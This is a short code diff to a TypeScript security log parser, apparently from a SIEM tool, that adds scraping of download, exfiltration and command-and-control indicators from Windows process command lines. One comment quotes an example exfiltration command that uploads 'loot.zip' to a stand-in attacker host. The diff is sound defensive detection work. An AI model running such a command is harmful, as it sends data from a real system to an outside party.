@@ -636,6 +636,11 @@ export function mapWindows(rec: Row, host: string, iocSink: Map<string, SiemIoc>
     if (f && f !== "-" && /[\\/]/.test(f)) addIoc(iocSink, "file", f);
   }
   if (processName) addIoc(iocSink, "process", processName);
+  // Scrape indicators embedded in a process command line's free-text (download / exfil URLs, C2
+  // domains, public IPs) — the structured-field extraction above misses these, so an exfil URL like
+  // `Invoke-RestMethod -Uri https://mft.attacker.tld -InFile loot.zip` never became an IOC. textIocs
+  // already skips internal AD/mDNS zones (.local/.lan/.corp) and filenames, so this stays signal-rich.
+  if (def.kind === "process") textIocs(str(getCI(ed, "CommandLine")), iocSink);
   const dns = str(getCI(ed, "QueryName")).trim();
   if (def.kind === "dns" && dns && dns !== "-" && /\./.test(dns)) addIoc(iocSink, "domain", dns.replace(/\.$/, ""));
 
